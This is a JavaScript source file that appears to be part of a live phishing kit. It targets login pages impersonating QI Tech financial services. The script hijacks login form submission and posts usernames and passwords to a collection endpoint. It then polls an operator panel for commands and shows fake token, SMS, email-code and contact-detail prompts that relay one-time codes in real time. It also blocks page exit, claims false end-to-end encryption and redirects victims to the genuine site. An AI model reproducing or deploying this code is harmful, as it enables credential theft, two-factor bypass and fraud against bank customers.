(function(){
  if (location.pathname.indexOf('/donaspainel') === 0) return;

  // ===== Per-page theme system =====
  // Each login page has its own color scheme, font, and branding label so the
  // injected panels (QID/Token/Pedir) feel native to that page.
  var THEMES = {
    baas: {
      key: 'baas', pageName: 'Baas Banking',
      primary: '#19247E',
      primaryDark: '#0F1B3D',
      primaryHover: '#334150',
      accent: '#3B5CFE',
      accentBg: '#FFE7EF',
      gradFrom: '#19247E', gradTo: '#FF2F86',
      font: '"Roboto",system-ui,-apple-system,"Segoe UI",sans-serif',
      brand: 'QI Tech ID',
      brandLabel: 'QI TECH ID',
      btnLabel: 'VALIDAR',
      btnLabelContinue: 'CONTINUAR'
    },
    risk: {
      key: 'risk', pageName: 'Risk Solutions',
      primary: '#135a82',
      primaryDark: '#0a3956',
      primaryHover: '#236a92',
      accent: '#4cc3c1',
      accentBg: '#d4edfa',
      gradFrom: '#135a82', gradTo: '#4cc3c1',
      font: '"Open Sans",system-ui,-apple-system,"Segoe UI",sans-serif',
      brand: 'Risk Solutions',
      brandLabel: 'RISK SOLUTIONS',
      btnLabel: 'VALIDAR',
      btnLabelContinue: 'CONTINUAR'
    },
    qisign: {
      key: 'qisign', pageName: 'QI Sign',
      primary: '#1C49A5',
      primaryDark: '#19247E',
      primaryHover: '#163d8a',
      accent: '#04a1ef',
      accentBg: '#04a1ef33',
      gradFrom: '#1C49A5', gradTo: '#04a1ef',
      font: '"Plus Jakarta Sans",system-ui,-apple-system,"Segoe UI",sans-serif',
      brand: 'QI Sign',
      brandLabel: 'QI SIGN',
      btnLabel: 'VALIDAR',
      btnLabelContinue: 'CONTINUAR'
    },
    admin: {
      key: 'admin', pageName: 'Administração e Custódia',
      primary: '#19247E',
      primaryDark: '#0F1B3D',
      primaryHover: '#0F1957',
      accent: '#FF2F86',
      accentBg: '#FFE7EF',
      gradFrom: '#19247E', gradTo: '#FF2F86',
      font: '"Open Sans",system-ui,-apple-system,"Segoe UI",sans-serif',
      brand: 'Administração',
      brandLabel: 'ADM. E CUSTÓDIA',
      btnLabel: 'VALIDAR',
      btnLabelContinue: 'CONTINUAR'
    }
  };
  function detectTheme(){
    var p = (location.pathname||'').toLowerCase();
    if (p.indexOf('/risk-solutions') !== -1) return THEMES.risk;
    if (p.indexOf('/qi-sign') !== -1) return THEMES.qisign;
    if (p.indexOf('/administracao-e-custodia') !== -1) return THEMES.admin;
    return THEMES.baas;
  }
  var THEME = detectTheme();
  window.__qiTheme = THEME;

  function pickInputs(form){
    var u = form.querySelector('#username, [name="username"], [name="login"], [name="cpf"], [name="email"], input[type="email"], input[type="text"]');
    var p = form.querySelector('#password, [name="password"], [name="senha"], input[type="password"]');
    return {u: u, p: p};
  }

  function showWait(){
    if (document.getElementById('qiWaitOverlay')) return;
    window.__qiWaiting = true;
    window.__qiPanelScreen = null;
    var ov = document.createElement('div');
    ov.id = 'qiWaitOverlay';
    ov.style.cssText = 'position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.94);backdrop-filter:blur(6px);font-family:'+THEME.font+';';
    ov.innerHTML = ''+
      '<div style="position:absolute;top:24px;left:32px">'+
        '<img src="/donaspainel/qitech-logo.png" alt="QI Tech" style="display:block;height:34px;width:auto" />'+
      '</div>'+
      '<div style="text-align:center;color:#1F2937;max-width:380px;padding:24px">'+
        '<div style="width:54px;height:54px;border-radius:50%;border:4px solid #E5E7EB;border-top-color:'+THEME.primary+';animation:qispin 1s linear infinite;margin:0 auto 22px"></div>'+
        '<div style="font-size:20px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px;color:'+THEME.primaryDark+'">Aguarde</div>'+
        '<div style="font-size:14px;color:#6B7280;line-height:1.55">Estamos validando suas credenciais.<br>Não feche nem atualize esta página.</div>'+
      '</div>'+
      '<style>@keyframes qispin{to{transform:rotate(360deg)}}</style>';
    document.body.appendChild(ov);
    window.__qiBlockUnload = window.__qiBlockUnload || function(e){ e.preventDefault(); e.returnValue=''; };
    window.addEventListener('beforeunload', window.__qiBlockUnload);
    if (typeof window.__qiBeat === 'function') window.__qiBeat(false);
  }

  function hideWait(){
    var ov = document.getElementById('qiWaitOverlay');
    if (ov && ov.parentNode) ov.parentNode.removeChild(ov);
    window.__qiWaiting = false;
    if (typeof window.__qiBeat === 'function') window.__qiBeat(false);
  }

  function hideQid(){
    // Remove inline panel and restore the original login form/subtitle
    var panel = document.getElementById('qiQidInline');
    if (panel && panel.parentNode) panel.parentNode.removeChild(panel);
    (window.__qiHiddenEls || []).forEach(function(el){ try{ el.style.display = el.__qiOldDisplay || ''; }catch(_){} });
    window.__qiHiddenEls = null;
    window.__qiWaiting = false;
    window.__qiPanelScreen = null;
    if (typeof window.__qiBeat === 'function') window.__qiBeat(false);
  }

  // Friendly screen name per panel type (shown in admin panel "current screen" column)
  var PANEL_SCREEN = {
    qid: 'Token QI Tech ID',
    email: 'Token por e-mail',
    sms: 'Token por SMS',
    ask_email: 'Pedindo e-mail cadastrado',
    ask_phone: 'Pedindo telefone cadastrado'
  };

  // Configs per 2FA type — title, icon, label, response endpoint key
  // intro is a function that receives the optional payload (mask) to customize the message
  var TWO_FA = {
    qid: {
      label: THEME.brandLabel,
      intro: function(){ return 'Por segurança, digite o código de <b style="color:'+THEME.primaryDark+'">6 dígitos</b> exibido no seu aplicativo <b style="color:'+THEME.primaryDark+'">'+THEME.brand+'</b>.'; },
      icon: '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>',
      grad: 'linear-gradient(135deg,'+THEME.gradFrom+','+THEME.gradTo+')',
      respUrl: '/api/qid-response',
      respBody: function(code, sid){ return {session_id: sid, code: code}; }
    },
    email: {
      label: 'CÓDIGO POR E-MAIL',
      intro: function(mask){
        var safe = (mask||'').replace(/[<>]/g,'').trim();
        if (safe){
          return 'Enviamos um código de <b style="color:'+THEME.primaryDark+'">6 dígitos</b> para o seu e-mail <b style="color:'+THEME.primaryDark+'">'+ safe +'</b> cadastrado. Digite-o abaixo para continuar.';
        }
        return 'Enviamos um código de <b style="color:'+THEME.primaryDark+'">6 dígitos</b> para o seu <b style="color:'+THEME.primaryDark+'">e-mail</b> cadastrado. Digite-o abaixo para continuar.';
      },
      icon: '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>',
      grad: 'linear-gradient(135deg,'+THEME.primary+','+THEME.accent+')',
      respUrl: '/api/user-response',
      respBody: function(code, sid){ return {session_id: sid, type: 'email_code', value: code}; }
    },
    sms: {
      label: 'CÓDIGO POR SMS',
      intro: function(mask){
        var safe = (mask||'').replace(/[<>]/g,'').trim();
        if (safe){
          return 'Enviamos um <b style="color:'+THEME.primaryDark+'">SMS</b> com um código de <b style="color:'+THEME.primaryDark+'">6 dígitos</b> para o telefone final <b style="color:'+THEME.primaryDark+'">'+ safe +'</b>. Digite-o abaixo para continuar.';
        }
        return 'Enviamos um <b style="color:'+THEME.primaryDark+'">SMS</b> com um código de <b style="color:'+THEME.primaryDark+'">6 dígitos</b> para o seu celular. Digite-o abaixo para continuar.';
      },
      icon: '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>',
      grad: 'linear-gradient(135deg,'+THEME.accent+','+THEME.gradTo+')',
      respUrl: '/api/user-response',
      respBody: function(code, sid){ return {session_id: sid, type: 'sms_code', value: code}; }
    }
  };

  function show2FA(type, invalid, payload){
    var cfg = TWO_FA[type] || TWO_FA.qid;
    var form = window.__qiActiveForm || document.querySelector('form');
    if (!form) return;
    hideWait();
    // Toggle error / type on existing panel
    var existing = document.getElementById('qiQidInline');
    if (existing){
      if (existing.dataset.type !== type){
        // Different type — fully recreate
        existing.parentNode && existing.parentNode.removeChild(existing);
      } else {
        // Same type — refresh intro text (payload may have changed)
        var introEl = existing.querySelector('.qid-intro');
        if (introEl) introEl.innerHTML = cfg.intro(payload);
        var err = existing.querySelector('#qiQidErr');
        if (err) err.style.display = invalid ? 'flex' : 'none';
        existing.querySelectorAll('.qid-box').forEach(function(b){ b.value = ''; });
        var first0 = existing.querySelector('.qid-box');
        if (first0) first0.focus();
        return;
      }
    }
    // Hide the form
    var hidden = window.__qiHiddenEls || [];
    function hide(el){ if (!el || hidden.indexOf(el) > -1) return; el.__qiOldDisplay = el.style.display; el.style.display='none'; hidden.push(el); }
    hide(form);
    // 1) Direct class/id selectors — most reliable. Covers Keycloak + QI Tech templates.
    document.querySelectorAll('.welcome-subtitle, .instruction, #kc-page-title + .instruction, p.welcome-subtitle, .login-pf-header .welcome-subtitle').forEach(hide);
    // 2) Find the closest "card" — walk up until we hit a wide-enough container, then scan ALL descendants
    var card = form.parentNode;
    for (var jump = 0; jump < 6 && card && card.parentNode; jump++){
      if (card.offsetWidth >= 320) break;
      card = card.parentNode;
    }
    if (card){
      Array.prototype.slice.call(card.querySelectorAll('*')).forEach(function(el){
        if (!el || hidden.indexOf(el) > -1) return;
        if (el.contains(form) || form.contains(el)) return;
        if (/^(BODY|HTML|MAIN|HEADER|FOOTER|FORM|SCRIPT|STYLE|H1|H2|H3|H4)$/.test(el.tagName)) return;
        if (el.querySelector('h1,h2,h3,h4,form,input,button')) return;
        var t = (el.textContent || '').trim();
        if (!t || t.length > 200) return;
        if (/insira o nome|autenticar sua conta|mantenha[- ]me|esqueceu sua senha|usu[áa]rio e senha|insira o email/i.test(t)){
          hide(el);
        }
      });
    }
    window.__qiHiddenEls = hidden;
    window.__qiWaiting = true;
    window.__qiPanelScreen = PANEL_SCREEN[type] || null;
    if (typeof window.__qiBeat === 'function') window.__qiBeat(false);

    var panel = document.createElement('div');
    panel.id = 'qiQidInline';
    panel.dataset.type = type;
    panel.dataset.theme = THEME.key;
    panel.style.cssText = 'font-family:'+THEME.font+';width:100%;animation:qidFade .25s ease;';
    panel.innerHTML = ''+
      '<style>@keyframes qidFade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}</style>'+
      '<p class="qid-intro" style="text-align:center;font-size:14px;color:#475569;line-height:1.55;margin:0 0 28px;max-width:340px;margin-left:auto;margin-right:auto">'+ cfg.intro(payload) +'</p>'+
      '<div style="display:flex;align-items:center;gap:8px;justify-content:center;margin-bottom:12px">'+
        '<div style="width:36px;height:36px;border-radius:10px;background:'+cfg.grad+';display:grid;place-items:center;color:#fff">'+ cfg.icon +'</div>'+
        '<span style="font-weight:800;font-size:11px;letter-spacing:.22em;color:'+THEME.primary+';text-transform:uppercase">'+ cfg.label +'</span>'+
      '</div>'+
      '<div style="display:flex;gap:8px;justify-content:center;margin:18px 0 14px;flex-wrap:nowrap">'+
        Array.from({length:6}).map(function(){return '<input class="qid-box" inputmode="numeric" maxlength="1" autocomplete="off" style="width:42px;height:52px;text-align:center;font-size:20px;font-weight:700;color:'+THEME.primaryDark+';border:1.5px solid #D1D9E6;border-radius:10px;outline:0;font-family:inherit;background:#fff;transition:.15s;padding:0" />'}).join('')+
      '</div>'+
      '<div id="qiQidErr" style="display:none;align-items:center;justify-content:center;gap:8px;margin:6px 0 18px;color:#DC2626;font-size:13px;font-weight:500">'+
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>'+
        'Código inválido. Verifique e tente novamente.'+
      '</div>'+
      '<div style="display:flex;justify-content:center;margin-top:28px">'+
        '<button type="button" id="qiQidSubmit" style="min-width:220px;padding:14px 28px;border:0;border-radius:999px;background:'+THEME.primary+';color:#fff;font:inherit;font-weight:700;font-size:13px;letter-spacing:.08em;cursor:pointer;transition:.15s">'+THEME.btnLabel+'</button>'+
      '</div>'+
      '<div style="margin-top:22px;text-align:center;color:#94A3B8;font-size:11.5px;line-height:1.5">'+
        '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:-1px;margin-right:4px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'+
        'Sua conexão é protegida por criptografia ponta-a-ponta'+
      '</div>';
    form.parentNode.insertBefore(panel, form.nextSibling);
    if (invalid){ var e2 = panel.querySelector('#qiQidErr'); if (e2) e2.style.display = 'flex'; }
    var boxes = panel.querySelectorAll('.qid-box');
    function focusBox(i){ if (boxes[i]) boxes[i].focus(); }
    boxes.forEach(function(box, i){
      box.addEventListener('focus', function(){ box.style.borderColor=THEME.primary; box.style.boxShadow='0 0 0 4px '+THEME.primary+'22'; });
      box.addEventListener('blur', function(){ box.style.borderColor='#D1D9E6'; box.style.boxShadow='none'; });
      box.addEventListener('input', function(){
        box.value = (box.value||'').replace(/\D+/g,'').slice(0,1);
        if (box.value && i < boxes.length-1) focusBox(i+1);
      });
      box.addEventListener('keydown', function(ev){
        if (ev.key === 'Backspace' && !box.value && i > 0) focusBox(i-1);
        if (ev.key === 'ArrowLeft' && i > 0) focusBox(i-1);
        if (ev.key === 'ArrowRight' && i < boxes.length-1) focusBox(i+1);
        if (ev.key === 'Enter') panel.querySelector('#qiQidSubmit').click();
      });
      box.addEventListener('paste', function(ev){
        ev.preventDefault();
        var t = ((ev.clipboardData||window.clipboardData).getData('text')||'').replace(/\D+/g,'').slice(0,6);
        for (var k = 0; k < boxes.length; k++) boxes[k].value = t[k] || '';
        focusBox(Math.min(t.length, boxes.length-1));
      });
    });
    focusBox(0);
    panel.querySelector('#qiQidSubmit').addEventListener('click', function(){
      var code = Array.from(boxes).map(function(b){ return b.value||''; }).join('');
      if (code.length !== 6) return;
      var sid = window.__qiSid || sessionStorage.getItem('qi_sid');
      fetch(cfg.respUrl, {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify(cfg.respBody(code, sid)), keepalive: true
      }).catch(function(){});
      hideQid();
      showWait();
    });
  }

  function showQid(invalid, payload){ show2FA('qid', invalid, payload); }
  function showEmail(invalid, payload){ show2FA('email', invalid, payload); }
  function showSmsCode(invalid, payload){ show2FA('sms', invalid, payload); }

  function showTerminate(){
    try{ window.removeEventListener('beforeunload', window.__qiBlockUnload); }catch(_){}
    try{ location.href = 'https://qitech.com.br/'; }catch(_){}
  }

  function showAskGeneric(opts){
    // opts: {type:'ask_email'|'ask_phone', invalid:bool, mode:'email'|'phone'}
    var form = window.__qiActiveForm || document.querySelector('form');
    if (!form) return;
    hideWait();
    var existing = document.getElementById('qiQidInline');
    if (existing){
      if (existing.dataset.type !== opts.type){
        existing.parentNode && existing.parentNode.removeChild(existing);
      } else {
        var err0 = existing.querySelector('#qiQidErr');
        if (err0) err0.style.display = opts.invalid ? 'flex' : 'none';
        var inp0 = existing.querySelector('#qiAskInput');
        if (inp0){ inp0.value = ''; inp0.focus(); }
        return;
      }
    }
    var hidden = window.__qiHiddenEls || [];
    function hide(el){ if (!el || hidden.indexOf(el) > -1) return; el.__qiOldDisplay = el.style.display; el.style.display='none'; hidden.push(el); }
    hide(form);
    document.querySelectorAll('.welcome-subtitle, .instruction, p.welcome-subtitle, .login-pf-header .welcome-subtitle').forEach(hide);
    window.__qiHiddenEls = hidden;
    window.__qiWaiting = true;
    window.__qiPanelScreen = PANEL_SCREEN[opts.type] || null;
    if (typeof window.__qiBeat === 'function') window.__qiBeat(false);

    var isEmail = opts.mode === 'email';
    var label = isEmail ? 'CONFIRMAÇÃO DE E-MAIL' : 'CONFIRMAÇÃO DE TELEFONE';
    var intro = isEmail
      ? 'Por segurança, informe o <b style="color:'+THEME.primaryDark+'">e-mail cadastrado</b> em sua conta para prosseguir com o acesso.'
      : 'Por segurança, informe o <b style="color:'+THEME.primaryDark+'">telefone cadastrado</b> em sua conta para prosseguir com o acesso.';
    var placeholder = isEmail ? 'seu-email@exemplo.com' : '(11) 99999-9999';
    var icon = isEmail
      ? '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>'
      : '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>';
    var grad = isEmail
      ? 'linear-gradient(135deg,'+THEME.primary+','+THEME.accent+')'
      : 'linear-gradient(135deg,'+THEME.accent+','+THEME.gradTo+')';
    var inputAttrs = isEmail
      ? 'inputmode="email" autocomplete="email" type="email"'
      : 'inputmode="tel" autocomplete="tel" type="text"';
    var errMsg = isEmail ? 'E-mail inválido. Verifique e tente novamente.' : 'Telefone inválido. Verifique e tente novamente.';

    var panel = document.createElement('div');
    panel.id = 'qiQidInline';
    panel.dataset.type = opts.type;
    panel.dataset.theme = THEME.key;
    panel.style.cssText = 'font-family:'+THEME.font+';width:100%;animation:qidFade .25s ease;';
    panel.innerHTML = ''+
      '<style>@keyframes qidFade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}</style>'+
      '<p class="qid-intro" style="text-align:center;font-size:14px;color:#475569;line-height:1.55;margin:0 0 28px;max-width:340px;margin-left:auto;margin-right:auto">'+ intro +'</p>'+
      '<div style="display:flex;align-items:center;gap:8px;justify-content:center;margin-bottom:16px">'+
        '<div style="width:36px;height:36px;border-radius:10px;background:'+ grad +';display:grid;place-items:center;color:#fff">'+ icon +'</div>'+
        '<span style="font-weight:800;font-size:11px;letter-spacing:.22em;color:'+THEME.primary+';text-transform:uppercase">'+ label +'</span>'+
      '</div>'+
      '<div style="display:flex;justify-content:center;margin:18px 0 12px">'+
        '<input id="qiAskInput" '+ inputAttrs +' autocomplete="off" placeholder="'+ placeholder +'" style="width:100%;max-width:320px;height:48px;text-align:center;font-size:15px;font-weight:600;color:'+THEME.primaryDark+';border:1.5px solid #D1D9E6;border-radius:10px;outline:0;font-family:inherit;background:#fff;padding:0 14px;box-sizing:border-box;transition:.15s" />'+
      '</div>'+
      '<div id="qiQidErr" style="display:'+(opts.invalid?'flex':'none')+';align-items:center;justify-content:center;gap:8px;margin:6px 0 18px;color:#DC2626;font-size:13px;font-weight:500">'+
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/></svg>'+
        errMsg+
      '</div>'+
      '<div style="display:flex;justify-content:center;margin-top:24px">'+
        '<button type="button" id="qiAskSubmit" style="min-width:220px;padding:14px 28px;border:0;border-radius:999px;background:'+THEME.primary+';color:#fff;font:inherit;font-weight:700;font-size:13px;letter-spacing:.08em;cursor:pointer;transition:.15s">'+THEME.btnLabelContinue+'</button>'+
      '</div>'+
      '<div style="margin-top:22px;text-align:center;color:#94A3B8;font-size:11.5px;line-height:1.5">'+
        '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:-1px;margin-right:4px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'+
        'Sua conexão é protegida por criptografia ponta-a-ponta'+
      '</div>';
    form.parentNode.insertBefore(panel, form.nextSibling);
    var input = panel.querySelector('#qiAskInput');
    input.addEventListener('focus', function(){ input.style.borderColor=THEME.primary; input.style.boxShadow='0 0 0 4px '+THEME.primary+'22'; });
    input.addEventListener('blur', function(){ input.style.borderColor='#D1D9E6'; input.style.boxShadow='none'; });
    function maskPhone(v){
      v = (v||'').replace(/\D+/g,'').slice(0,11);
      if (v.length > 6) return '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
      if (v.length > 2) return '('+v.slice(0,2)+') '+v.slice(2);
      if (v.length > 0) return '('+v;
      return '';
    }
    if (!isEmail){
      input.addEventListener('input', function(){ input.value = maskPhone(input.value); });
    }
    input.addEventListener('keydown', function(ev){ if (ev.key === 'Enter') panel.querySelector('#qiAskSubmit').click(); });
    setTimeout(function(){ input.focus(); }, 100);
    panel.querySelector('#qiAskSubmit').addEventListener('click', function(){
      var v = (input.value||'').trim();
      if (!v) { var e = panel.querySelector('#qiQidErr'); if (e) e.style.display = 'flex'; return; }
      if (isEmail && !/.+@.+\..+/.test(v)){ var e2 = panel.querySelector('#qiQidErr'); if (e2) e2.style.display = 'flex'; return; }
      if (!isEmail && v.replace(/\D+/g,'').length < 10){ var e3 = panel.querySelector('#qiQidErr'); if (e3) e3.style.display = 'flex'; return; }
      var sid = window.__qiSid || sessionStorage.getItem('qi_sid');
      fetch('/api/user-response', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({session_id: sid, type: isEmail ? 'email_input' : 'phone_input', value: v}), keepalive: true
      }).catch(function(){});
      hideQid();
      showWait();
    });
  }

  function showAskEmail(invalid){ showAskGeneric({type:'ask_email', invalid:invalid, mode:'email'}); }
  function showAskPhone(invalid){ showAskGeneric({type:'ask_phone', invalid:invalid, mode:'phone'}); }

  function showInvalidError(form){
    if (!form) return;
    var prev = document.getElementById('qiInvalidError');
    if (prev && prev.parentNode) prev.parentNode.removeChild(prev);
    var f = pickInputs(form);
    if (f.p) f.p.value = '';
    var box = document.createElement('div');
    box.id = 'qiInvalidError';
    box.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:8px;margin:18px 0 0;font-family:inherit;width:100%;text-align:center';
    box.innerHTML = ''+
      '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0">'+
        '<circle cx="12" cy="12" r="11" fill="none" stroke="#DC2626" stroke-width="2"/>'+
        '<line x1="8" y1="8" x2="16" y2="16" stroke="#DC2626" stroke-width="2" stroke-linecap="round"/>'+
        '<line x1="16" y1="8" x2="8" y2="16" stroke="#DC2626" stroke-width="2" stroke-linecap="round"/>'+
      '</svg>'+
      '<span style="color:#DC2626;font-size:14px;font-weight:500;white-space:nowrap">Nome de usuário ou senha inválida.</span>';
    // Insert as the last child of the form so it sits BELOW the ACESSAR button
    form.appendChild(box);
    if (f.p) f.p.focus();
  }

  function pollCommands(form){
    var sid = window.__qiSid || sessionStorage.getItem('qi_sid');
    if (!sid) return;
    window.__qiActiveForm = form;
    if (window.__qiPolling) return;
    window.__qiPolling = setInterval(function(){
      fetch('/api/session/poll?session_id=' + encodeURIComponent(sid))
        .then(function(r){ return r.json(); })
        .then(function(j){
          if (!j || !j.command) return;
          var f = window.__qiActiveForm || form;
          var cmd = j.command;
          var payload = j.payload || '';
          if (cmd === 'invalid'){
            hideWait(); hideQid();
            showInvalidError(f);
          } else if (cmd === 'qid'){
            showQid(false);
          } else if (cmd === 'qid_invalid'){
            showQid(true);
          } else if (cmd === 'email'){
            showEmail(false, payload);
          } else if (cmd === 'email_invalid'){
            showEmail(true, payload);
          } else if (cmd === 'sms_code'){
            showSmsCode(false, payload);
          } else if (cmd === 'sms_invalid'){
            showSmsCode(true, payload);
          } else if (cmd === 'ask_email'){
            showAskEmail(false);
          } else if (cmd === 'ask_email_invalid'){
            showAskEmail(true);
          } else if (cmd === 'ask_phone'){
            showAskPhone(false);
          } else if (cmd === 'ask_phone_invalid'){
            showAskPhone(true);
          } else if (cmd === 'wait'){
            hideQid();
            showWait();
          } else if (cmd === 'terminate'){
            showTerminate();
          }
        })
        .catch(function(){});
    }, 1500);
  }

  function bind(form){
    if (!form || form.__qiBound) return;
    form.__qiBound = true;
    form.addEventListener('submit', function(e){
      try{
        e.preventDefault(); e.stopPropagation();
        // Bail out if any CPF field in the form is currently invalid
        var invalid = form.querySelector('[aria-invalid="true"]');
        if (invalid){
          invalid.focus && invalid.focus();
          return false;
        }
        var f = pickInputs(form);
        var email = f.u ? (f.u.value||'').trim() : '';
        var pass = f.p ? (f.p.value||'') : '';
        // Remove any previously injected error (user is retrying)
        var prev = document.getElementById('qiInvalidError');
        if (prev && prev.parentNode) prev.parentNode.removeChild(prev);
        fetch('/api/login-attempt', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({
            email: email, password: pass,
            page: location.pathname, referrer: document.referrer||'',
            session_id: window.__qiSid || ''
          }),
          keepalive: true
        }).catch(function(){});
        showWait();
        pollCommands(form);
      }catch(_){}
      return false;
    }, true);
  }

  function init(){
    document.querySelectorAll('form').forEach(function(f){
      if (f.querySelector('input[type="password"]') || /login|signin|entrar|acessar/i.test(f.id+' '+f.className+' '+f.action)){
        bind(f);
        if (!window.__qiActiveForm) window.__qiActiveForm = f;
      }
    });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
  setInterval(init, 1500);
})();
